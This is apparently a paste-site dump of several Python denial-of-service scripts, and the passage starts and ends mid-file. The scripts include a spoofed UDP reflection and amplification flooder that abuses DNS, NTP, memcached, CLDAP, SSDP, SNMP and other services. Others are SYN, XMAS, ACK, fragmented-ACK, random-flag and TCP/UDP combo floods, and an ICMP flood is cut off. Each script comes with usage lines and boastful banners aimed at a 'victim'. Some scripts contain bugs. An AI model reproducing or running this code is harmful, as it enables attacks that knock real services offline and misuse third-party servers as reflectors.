    '<:Envelope><:Header><:MessageID>a</:MessageID></:Header><:Body><:Probe></:Probe></:Body></:Envelope>',
    '<Envelope><Body><Probe></Probe></Body></Envelope>'
]

def _mix(_victim):
    global _vuln, _wsd
    _Server, _prt = '127.0.0.1', 80
    i = 0

    while _abort == False:
        try:
            try:
                entry = _vuln[i]
                _Server, _prt = entry.strip().split(':')
            except:
                _Server, _prt = '127.0.0.1', '80'
            
            pkt = IP()
            payload = b''
            
            if int(_prt) == 53: # DNS
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=53) / DNS(rd=1,opcode=0,qd=DNSQR(qname='www.example.com',qclass=""IN"",qtype=""A""))
            
            elif int(_prt) == 520: # RIP
               payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10'
               packet = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=520) / payload
            
            elif (int(_prt) == 37777 or int(_prt) ==37778 or int(_prt) ==37810): # DVR
               payload = b'\x44\x48\x49\x50'
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=int(_prt)) /  payload #Raw(load=payload)
            
            elif int(_prt) == 3702: # WS-DISCOVERY
               payload = random.choice(_wsd)
               pkt = IP(dst=_Server,src=_victim)/UDP(sport=44206,dport=3702)/ payload.encode()
            
            elif int(_prt) == 11211: # MEMCACHE
               payload = b'\x00\x00\x00\x00\x00\x01\x00\x00get injected\r\n'
               #          '\x00\x01\x00\x00\x00\x01\x00\x00get injected\n'
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=random.randint(2000,65535), dport=11211) / Raw(load=payload)
            
            elif int(_prt) == 1433: # MSSQL
               payload = b'\x02'
               pkt = IP(dst=_Server,src=_victim)/UDP(sport=44206,dport=1434)/ payload #Raw(load=payload)
            
            elif int(_prt) == 123: # NTP
               payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'    # or ""\x17\x00\x03\x2a"" + ""\x00"" * 4
               pkt = IP(dst=_Server, src=_victim)/UDP(sport=random.randint(2000,65535), dport=123)/Raw(load=payload)
            
            elif int(_prt) == 389: # CLDAP
               payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                          b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00')
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=389) / payload
               
            elif int(_prt) == 636: # LDAP alt
               payload = (b'\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00'
                          b'\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63'
                          b'\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00')
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=636) / payload
            
            elif int(_prt) == 19: # CHARGEN
                payload = b'\x01'
                pkt = IP(dst=_Server, src=_victim) / UDP(sport=random.randint(2000,65535), dport=19)/ Raw(load=payload)
            
            elif int(_prt) == 3389: # RDP
               payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=3389) / payload
            
            elif int(_prt) == 1900: # SSDP
               payload = ""M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \""ssdp:discover\""\r\nMX: 2\r\nST: ssdp:all\r\n\r\n""
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=1900,dport=1900) / Raw(load=payload)
            
            elif int(_prt) == 161: # SNMP
               payload = ""\x30\x37\x02\x01"" #snmp
               payload += ""\x01"" #v2
               payload += ""\x04\x06\x70\x75\x62\x6c\x69\x63"" #community=public
               payload += ""\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00"" #getBulkRequest
               pkt = IP(dst=_Server, src=_victim)/UDP(sport=161,dport=161)/Raw(load=payload)
            
            elif int(_prt) == 10001: # UBIQUITI
               payload = b'\x01\x00\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=10001) / payload
            
            elif int(_prt) == 3283: # ARD
               payload = b'\x00\x14\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=3283) / payload
               
            elif int(_prt) == 1234: # Adware reflectors
               payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(1000, 4096)))
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=RandShort(), dport=1234) / payload.encode()

            else:
               payload = b'disrespect = disconnect'
               pkt = IP(src='69.420.13.37', dst=_victim) / UDP(sport=RandShort(), dport=80) / payload
            
            send(pkt, verbose=False)
            
            i+=1
            if i == len(_vuln):
                i = 0
        except KeyboardInterrupt:
            pass
    
    
def _rslv():
    _host = sys.argv[1]
    if not (_host.lower().startswith('http://') or _host.lower().startswith('https://')):
        _host = 'http://' + _host
    try:
        _domain = urlparse(_host).netloc
        _addr = socket.gethostbyname(_domain)
        return _addr
    except:
        sys.exit('\r\n DNS resolution error! Revalidate host.\r\n')


def main():
    os.system('clear')
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <ip/url> <reflectors.txt ip:port> <time> <threading>\r\n')
        
    # ensure script has admin priviliges
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')
    
    global _abort, _wsd
    # url/domain -> ip
    _ip = _rslv()
    
    # add ip:port to list
    print(' Importing reflector list. Please stand-by...\r\n')
    try:
        with open(sys.argv[2], ""r"") as f:
            for line in f:
                if ""\n"" in line:
                    # remove any carriage return/s
                    line = line.replace(""\n"", """")
                    _vuln.append(line)
                else:
                    _vuln.append(line)
    except KeyboardInterrupt:
        sys.exit('\r\n Aborted by user.')
    except: #FileNotFoundError:
        sys.exit('\r\n Critical error encountered!\r\n')
    
    # thread execution
    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_mix, args=(_ip,))
        tasks.append(x)
        x.start()
        
    # disrespect = disconnect
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n
                 ▄██                
               ▄█████               
              ████████              
             ░░████████             
              ░░████████            
             ▄▄░░████████           
           ▄████░░████████          
          ███████░░████████         
         ░░███████░░████████        
          ░░███████░░████████       
         ▄▄░░███████░░████████      
       ▄████░░███████░░████████     
     ▄███████░░███████░░████████    
    ░▀████████░░███████░░████████   
     ░░░░░░░░░█░█░░░░░░█░░░░░░░░            
            ░░█░▀    ░░█            
    ▄▄ ▄   ▄▄░█ ▄   ▄▄░█   ▄▄ ▄ ▄██▄
  ▄█████ ▄█████░█ ▄█████░▄█████░█░▀█
 ░█▀░░▀█░█▀░░▀█░█░█▀░░▀█░█▀░░▀█░▀█▄ 
░░█  ░░█░█  ░░█░█░█  ░░█░█  ░░█ ░░██
░░█▄ ░▄█░█▄ ░▄█░█░█▄ ░▄█░█▄ ░▄█ █▄░█
░░▀███▀█░░▀██▀█░█░░▀██▀█░░▀██▀█░▀██▀
 ░░░░░░░ ░░░ ░░░ ░░░░░░ ░░░░░░░ ░░
"""""")
    print(' Disrespect = Disconnect ~ Hammering ' + _ip + ' for ' + sys.argv[3] + ' seconds...\r\n')
    
    # wait duration of attack
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass

    # power-down threads
    _abort = True
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done.\r\n')
    
if __name__ == ""__main__"":
    main()"
XW3wQBY1,tsunami.py,betrayed,Python,Thursday 2nd of May 2024 10:43:01 PM CDT,"#!/usr/bin/env python3
import time, sys, threading, os, random, string
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_ip = ''

def _tsunami(_min, _max):
    while _abort == False:
        try:
            payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(int(_min), int(_max))))
            fake = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=fake) / TCP(sport=RandShort(), dport=int(sys.argv[2]), flags=""S"") / payload.encode()
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    global _ip
    _host = sys.argv[1].lower()
    if not (_host.startswith(""http://"") or _host.startswith(""htts://"")):
        _host = ""http://"" + _host
        
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
    except:
        sys.exit(""\r\n DNS resolution failed! Exiting...\r\n"")
        
def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n Usage: <ip/url> <port> <byte range: x-y> <time> <threading>\r\n"")
        
    if not os.geteuid() == 0:
        sys.exit(""\r\n Script requires root elevation!\r\n"")
        
    try:
        _min, _max = sys.argv[3].split(""-"")
    except:
        sys.exit(""\r\n Invalid byte range detected! Exiting...\r\n"")
    
    os.system('clear')
    global _abort, _ip
    _rslv()
        
    print(""""""\r\n\r\n\r\n 
                                       ██
                                     ██████
                                     ██░░██
                                   ████░░████
                                   ██░░░░░░██
                                 ████░░░░░░████
                                 ██░░░░░░░░░░██
                               ████░░░░░░░░░░████
                               ██░░░░░░░░░░░░░░██
                             ████░░████████░░░░████
                             ██░░████████████░░░░██
                           ████████████████████░░████
                           ████████████████░░░░██░░██
                         ████████████████░░░░░░░░░░████
                         ████████████████░░░░░░░░░░░░██
                       ████████████████████░░░░░░░░░░████
                       ██████████████████████████████████
                     ██████████████████████████████████████

"""""")
    print("" Overtaking enemy @ "" + _ip + "":"" + sys.argv[2] + "" with inflated SYN streams for "" + sys.argv[4] + "" seconds!\r\n"")

    tasks = []
    for x in range(0, int(sys.argv[5])):
        x = threading.Thread(target=_tsunami, args=(_min, _max))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[4])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == ""__main__"":
    main()"
GMmjUY60,dominate.py,betrayed,Python,Thursday 2nd of May 2024 10:42:45 PM CDT,"#!/usr/bin/env python3
import time, sys, threading, os, random, string
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_ip = ''

def _dominate():
    while _abort == False:
        try:
            fake = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=fake) / TCP(sport=RandShort(), dport=int(sys.argv[2]), flags=""SEC"")
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    global _ip
    _host = sys.argv[1].lower()
    if not (_host.startswith(""http://"") or _host.startswith(""htts://"")):
        _host = ""http://"" + _host
        
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
    except:
        sys.exit(""\r\n DNS resolution failed! Exiting...\r\n"")
        
def main():
    if len(sys.argv) != 5:
        sys.exit(""\r\n Usage: <ip/url> <port> <time> <threading>\r\n"")
        
    if not os.geteuid() == 0:
        sys.exit(""\r\n Script requires root elevation!\r\n"")
    
    os.system('clear')
    global _abort, _ip
    _rslv()
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n
   ▄         ▄    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄      ▄     ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░▌       ▐░▌  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌    ▐░▌   ▐░░░░░░░░░░░▌
 ▄█░█▄▄▄▄▄▄▄█░█▄ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌    ▐░▌    ▀▀▀▀█░█▀▀▀▀ 
▐░░░░░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌          ▐░▌    ▐░▌        ▐░▌     
 ▀█░█▀▀▀▀▀▀▀█░█▀ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄█░█▄▄      ▐░▌     
  ▐░▌       ▐░▌  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
 ▄█░█▄▄▄▄▄▄▄█░█▄ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     
▐░░░░░░░░░░░░░░░▌▐░▌     ▐░▌  ▐░▌          ▐░▌       ▐░▌     ▐░▌     
 ▀█░█▀▀▀▀▀▀▀█░█▀ ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌     ▐░▌     
  ▐░▌       ▐░▌  ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌     
   ▀         ▀    ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀      
"""""")
    print("" Slaughtering the oppz! "" + _ip + "":"" + sys.argv[2] + "" is taking heavy damage for "" + sys.argv[3] + "" seconds...\r\n"")

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_dominate)
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == ""__main__"":
    main()
"
FPEctZq4,L4combo.py,betrayed,Python,Thursday 2nd of May 2024 10:42:17 PM CDT,"import sys, time, socket, threading                        

_abort = False
_data = """"

def _udp():
    while _abort == False:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while _abort == False:
                s.send(data.encode())
            
            s.close()
        except:
            s.close()
    
def _tcp():
    while _abort == False:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while _abort == False:
                s.send(data.encode())
            
            s.close()
        except:
            s.close()

def main():
    global _abort, _data
    if len(sys.argv) != 5:
        sys.exit('\r\n USAGE: <IP> <PORT> <SIZE> <TIME>\r\n')

    x = """"
    while len(x) < int(sys.argv[3]):
        x = x + ""$""
    _data = x
   
    print('''\r\n\r\n\r\n\r\n\r\n\r\n\r\n
                  ▄▄▄▄▄▄▄▄▄
               ▄██▀▀▀███▀▀▀██▄
            ▄███     ░█     ░░██▄            
          ░█▀░█   ░▄██▀  ░▄▄██▀░▀█▄          
        ░██   ░█  ░█    ░█▀      ░▀█         
       ░█▀  ░▄█   ░█▄   ░█         ░█        
      ░██   ░█     ░█  ░██    ░▄██▄ ░█       
     ░██▀█▄  ░█▄   ░█  ░█   ░▄▀ ░▀██▄██      
     ░█  ░█   ░▀██▄███████▄░█      ░▀▀██     
    ░█  ░█      ░███░███░███▄         ░█     
    ░█   ░▀███▄░█░█████████░█░▄████▄  ░██    
    ░█       ░▀███████████████▀   ░▀█  ░█    
    ░█▀▀█▄    ░█░███████████░█     ░▀█▄░█    
    ░█ ░▀█ ░▄███████████████████▄    ░▀██    
    ░█  ░▀██▀  ░█░█████████░█   ░▀█▄  ░█     
    ░██        ░▄███░███░████     ░█  ░█     
     ░█       ░▄█░▀███████▀░▀█   ░█  ░█▀   
     ░▀██▄▄▄ ░█▀   ░█  ░█    ░▀█  ░██▄█      
      ░▀█   ▀▀    ░██  ░▀▄    ░█▀  ░██       
       ░▀█        ░█    ░█  ░▄█▀  ░██        
        ░▀█▄ ░▄████▀  ░▄▄▀  ░▀█ ░▄█▀
         ░░▀███      ░█▀     ░█▄██ 
          ░░░░▀██▄   ░█    ░▄██▀░
            ░░░░▀▀█▄▄███▄▄▄▀▀░               
               ░░░░░▀▀▀▀▀░    
''')
    print(""\r\n   Victim @ "" + sys.argv[1] + "":"" + sys.argv[2] + "" is taking massive L's for "" + sys.argv[4] + "" seconds...\r\n"")

    t1 = threading.Thread(target = _udp)
    t2 = threading.Thread(target = _tcp)
    t1.start()
    t2.start()
    
    stopAt = time.time() + int(sys.argv[4])
    try:
        while time.time() < stopAt:
            pass
    except KeyboardInterrupt:
        pass
     
    _abort = True
    
    t1.join()
    t2.join()
    
    sys.exit('\r\n Hail victory!\r\n')

if __name__ == ""__main__"":
    main()"
Pqad201B,bogus.py,betrayed,Python,Thursday 2nd of May 2024 10:41:49 PM CDT,"import sys, socket, time, threading
import random, string, os
from scapy.all import *

_abort = False

def _ssyn():
    _flags = ['S','A','P','U','F','R','E','C']
    while _abort == False:
        try:
            # choose random flag/s to send
            flag = ''
            max = random.randint(1, len(_flags))
            while max != 0:
                new = random.choice(_flags)
                if not new in flag:
                    flag = flag + new
                    max -=1
                    
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = flag # SYN flag set
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass

def main():
    global _abort
    if len(sys.argv) != 5:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <TIME> <THREADS>\r\n"")

    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n    Script requires root elevation!\r\n"")

    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n
.............. MMM......................
..  ..  ..... . MMN...  ..  ..  ..  .. .
         .MMM7..~MM. ......            .
      .., MMMMMMMMMM..MMMM.            .
.......NMMM,.MMMMMMMMMMN .........b.....
........MMMMMMMMMMMMMM. .......,ZMMM....
.........~MMMMMMMMMMMMM .....?MMMMMMMD..
    .,MMMMMMMMMMMMMMMM~.. .:MMMMMMMMMM. 
..  .., .MMMMMMMMMMMMMMM... MMMMMMMMMMN 
  ..ZMM7NMMMMMMMMMMMMMD.  ... MMMMMMMMM=
........MMMMMMMMMMMMMM .......MMMMMMMMMM
  .. ..MMMMMMMMMMMMMMMI   ...MMMMMMMMMMZ
     .=DMM.MMMMMMMMMMMMM   ..MMMMMMM ...
      .. .+M. .MMMMMMMMM.   .  ,MMMM,  .
      ..:::.. .MMMM    .     .,MMMMMM  .
    .MMMMMMMMMMMMMMMMM7...IMMMMMMMMMM...
     MMMM$   . MMMMMMMMMMMMMMMMMMMMMM. .
    .MMMM     .MMMMMMMMMMMMMMMM,..MM.  .
   .MMMMM.   . MMMMMMMMMMMMNZ.         .
   MMMMMMM    .MMMMMMMM      ... .     .
   MMMMMM .    8MMMMMMM,. ..ZMMMMM..   .
    ,DMM.      .MMMMMMMMMMMMMMMMMM.    .
               .MMMMMMMMMMMMMMMMMM.    .
                =MMMMMMMMMMMIMMMM.     .
               .:MMMMZ.   .8MMM        .
    ... .    ..OMMMM.   ..MMMMM...     .
   .MMMMM. ...MMMMM.  ...MMMMMMMMMM.....
 .NNMMMMMMMMMMMMMM .    ,MMMMMMMMMMM.  .
.MMMMMMMMMMMMMMMM.        .  ?NMMMN..  .
MMMMMM,. $MMMMM8.                      .
MMMM,.    .MM7                         .
D~..                                   ."""""")
    print("" #offline   Overwhelming "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[3] + "" seconds...\r\n"")
    
    _thread = []
    i = 0
    for i in range(0, int(sys.argv[4])):
        i +=1
        x = threading.Thread(target=_ssyn)
        _thread.append(x)
        x.start()
    
    _duration = time.time() + int(sys.argv[3])
    try:
        while time.time() < _duration:
            pass
    except KeyboardInterrupt:
        pass

    _abort = True
     
    for y in _thread:
        y.join()
         
    sys.exit('\r\n Done!\r\n')
    
if __name__ == ""__main__"":
    main()"
7La8Je7X,xmas.py,betrayed,Python,Thursday 2nd of May 2024 10:41:34 PM CDT,"import sys, socket, time, threading
import random, string
from scapy.all import *

_abort = False

def _xmas():
    data = ''
    while _abort == False:
        try:
            _fake = ""."".join(map(str, (randint(0,255)for _ in range(4))))
            template = IP(dst=sys.argv[1], src=_fake)/TCP()
            template[TCP].flags = ""FSRPAUEC""
            xmas = []
            xmas.extend(template)
            xmas[0][TCP].dport=int(sys.argv[2])
            send(xmas, verbose=False)
        except:
            pass

def main():
    global _abort
    if len(sys.argv) != 5:
        sys.exit(""\r\n    SYNTAX: <IP> <PORT> <TIME> <THREADS>\r\n"")

    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n    Script requires root elevation!\r\n"")
        
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░░░░░░░░░░▀█░░░░░░▄▀▄░▄▀▄░▄▀▄░░░░░█▀█░█▀▀░█▀▀░█░░░▀█▀░█▀█░█▀▀░░░░░░░░░  
 ░░░░░░░░▄█▄░░█░░▄▄▄░▄▀▄░█░█░█░█░▄▄▄░█░█░█▀▀░█▀▀░█░░░░█░░█░█░█▀▀░░░░░░░░░  
 ░░░░░░░░░▀░░▀▀▀░░░░░░▀░░░▀░░░▀░░░░░░▀▀▀░▀░░░▀░░░▀▀▀░▀▀▀░▀░▀░▀▀▀░░░░░░░░░  
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░▀█▀░█░█░█▀█░█▀█░█░█░█▀▀░░░█▀▀░█▀█░█▀▄░░░█▀█░█░░░█▀█░█░█░▀█▀░█▀█░█▀▀░█░░
 ░░█░░█▀█░█▀█░█░█░█▀▄░▀▀█░░░█▀▀░█░█░█▀▄░░░█▀▀░█░░░█▀█░░█░░░█░░█░█░█░█░▀░░
 ░░▀░░▀░▀░▀░▀░▀░▀░▀░▀░▀▀▀░░░▀░░░▀▀▀░▀░▀░░░▀░░░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀░░
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
"""""")
    print("" Merry Christmas! Slaying "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[3] + "" seconds...\r\n"")

    _thread = []
    #i = 0
    for i in range(0, int(sys.argv[4])):
        #i +=1
        x = threading.Thread(target=_xmas)
        _thread.append(x)
        x.start()
    
    _duration = time.time() + int(sys.argv[3])
    try:
        while time.time() < _duration:
            pass
    except KeyboardInterrupt:
        pass

    _abort = True
     
    for y in _thread:
        y.join()
         
    sys.exit(""\r\n Done!\r\n"")
    
if __name__ == ""__main__"":
    main()"
7HRGBc58,ack-frag.py,betrayed,Python,Thursday 2nd of May 2024 10:41:17 PM CDT,"#!/usr/bin/env python3
import sys, time, threading, socket
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _udp(_ip):
    while _abort == False:
        try:
            # Sequence number changes but ACK number does not
            _s = 1000
            _a = RandShort()
            _p = RandShort()
            _fraud = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            for _ in range(random.randint(50, 100)):
                # ACK packets w/ MF (More Fragments) flag set / protocol six = TCP
                pkt = IP(dst=_ip, src=_fraud, flags=""MF"", proto = 6, frag = 0) / TCP(sport=_p, dport=int(sys.argv[2]), flags=""A"", seq=_s, ack=_a)
                send(pkt, verbose=False)
                _s +=1
                
                if _abort == True:
                    break
                  
            # complete the fragementations w/ a final ACK packet
            _s +=1
            pkt = IP(dst=_ip, src=_fraud) / TCP(sport=_p, dport=int(sys.argv[2]), flags=""A"", seq=_s, ack=_a)
            send(pkt, verbose=False)
        except KeyboardInterrupt:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = ""http://"" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <ip/url> <port> <time> <threading>\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort

    os.system('clear')
    print('''
                    ██████████████            
                ████░░░░░░░░░░░░░░████        
              ██░░░░██░░░░░░░░░░██░░░░██      
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░██    
            ██░░░░░░██░░░░░░░░░░██░░░░░░██    
          ██░░██░░░░░░░░░░░░░░░░░░░░░░██░░██  
          ██░░░░░░░░██░░░░░░░░░░██░░░░░░░░██  
          ██░░██░░░░░░░░██░░██░░░░░░░░██░░██  
        ██░░░░░░░░░░▒▒▒▒░░░░░░▒▒▒▒░░░░░░░░░░██
        ██░░░░░░░░░░░░░░▒▒▒▒▒▒░░░░░░░░░░░░░░██
        ██░░░░░░████████░░▒▒░░████████░░░░░░██
        ██░░░░░░██    ██░░░░░░██    ██░░░░░░██
          ██░░░░░░████░░░░░░░░░░████░░░░░░██  
          ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
          ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
            ██░░░░░░▓▓░░░░░░░░░░▓▓░░░░░░██    
            ██░░░░▓▓░░░░██░░██░░░░▓▓░░░░██    
              ██▓▓░░██░░░░░░░░░░██░░▓▓██      
              ██░░░░░░░░██░░██░░░░░░░░██      
                ██░░░░░░░░░░░░░░░░░░██        
                  ██░░░░██░░██░░░░██          
                    ██░░░░░░░░░░██            
                      ██████████              
''')
    print(' Booting ' + _ip + "":"" + sys.argv[2] + ' for ' + sys.argv[3] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_udp, args=(_ip,))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == '__main__':
    main()"
McgxUYip,ack.py,betrayed,Python,Thursday 2nd of May 2024 10:40:55 PM CDT,"#!/usr/bin/env python3
import sys, time, threading, socket
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _udp(_ip):
    while _abort == False:
        try:
            _fraud = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=_fraud) / TCP(dport=target_port, flags=""A"" seq=RandShort(), ack=RandShort())
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = ""http://"" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 6:
        sys.exit('\r\n Usage: <ip/url> <port> <time> <threading>\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort

    os.system('clear')
    print('''
  ██████╗  ██████╗   ██████╗   ███████╗██╗     ███████╗███████╗██████╗
 ██╔════╝ ██╔═══██╗  ╚════██╗  ██╔════╝██║     ██╔════╝██╔════╝██╔══██╗
 ██║  ███╗██║   ██║   █████╔╝  ███████╗██║     █████╗  █████╗  ██████╔╝
 ██║   ██║██║   ██║  ██╔═══╝   ╚════██║██║     ██╔══╝  ██╔══╝  ██╔═══╝
 ╚██████╔╝╚██████╔╝  ███████╗  ███████║███████╗███████╗███████╗██║
  ╚═════╝  ╚═════╝   ╚══════╝  ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝          
''')
    print("" Shhh....they're sleeping! Dropping "" + _ip + "":"" + sys.argv[2] + ' for ' + sys.argv[3] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_udp, args=(_ip,))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == '__main__':
    main()"
D42sMaxy,legion.py,betrayed,Python,Thursday 2nd of May 2024 10:40:37 PM CDT,"import threading, sys, time, random, string
from scapy.all import *

_abort = False
rslvrs = []

def _icmp():
    while _abort == False:
        try:
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=int(sys.argv[3])))
            fakeIP = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            socket = conf.L2socket(iface=sys.argv[6].lower())
            _chs = random.randint(0, 1)
            if _chs == 0:
                pkt = IP(dst=sys.argv[1],src=fakeIP) / ICMP(type=8,code=0) / payload.encode()
            else:
                pkt = IP(dst=sys.argv[1],src=fakeIP) / ICMP(type=3,code=3) / payload.encode()
            send(pkt, verbose=0)
        except KeyboardInterrupt:
            sys.exit()
            
def _dominate():
    while _abort == False:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

